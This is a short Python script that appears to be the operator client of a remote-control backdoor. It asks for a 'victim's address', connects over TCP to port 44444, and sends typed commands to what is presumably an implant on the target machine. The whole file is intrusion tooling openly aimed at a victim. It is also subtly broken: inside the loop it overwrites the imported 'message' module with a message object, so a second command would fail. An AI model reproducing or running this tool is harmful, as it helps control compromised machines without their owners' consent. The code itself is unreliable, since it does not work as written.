import socket, message
HOST = "0.0.0.0"
PORT = 44444

if __name__ == "__main__":
    HOST = input("victim's address: ")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    print("igen igen")
    while True:
        try:
            message = message.Message(input("> ").strip())
            if message.message == "exit":
                print("igen igen")
                break
            if message.message == "":
                continue
            client.send(message.Encode().encode("utf-8"))
        except Exception as e:
            print(f"Error: {e}")
    print("Done")